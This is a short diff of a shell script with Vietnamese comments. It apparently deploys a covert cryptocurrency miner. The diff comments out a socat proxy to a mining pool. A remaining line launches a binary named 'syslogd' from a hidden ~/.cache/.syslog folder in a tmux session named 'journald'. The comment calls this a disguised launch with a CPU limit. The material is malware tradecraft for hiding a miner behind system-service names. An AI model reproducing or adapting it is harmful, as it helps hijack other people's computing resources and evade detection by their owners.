@@ -59,8 +59,8 @@ cat > .cfg.json <<EOF
 EOF
 
 # ==== Tạo proxy từ port 80 sang pool TLS ====
-tmux has-session -t proxy 2>/dev/null || \
-tmux new-session -d -s proxy "sudo socat TCP-LISTEN:8888,reuseaddr,fork TCP:$POOL_REAL"
+#tmux has-session -t proxy 2>/dev/null || \
+#tmux new-session -d -s proxy "sudo socat TCP-LISTEN:8888,reuseaddr,fork TCP:$POOL_REAL"
 
 # ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
 tmux has-session -t journald 2>/dev/null || tmux new-session -d -s journald "cd ~/.cache/.syslog && ./syslogd -c .cfg.json"
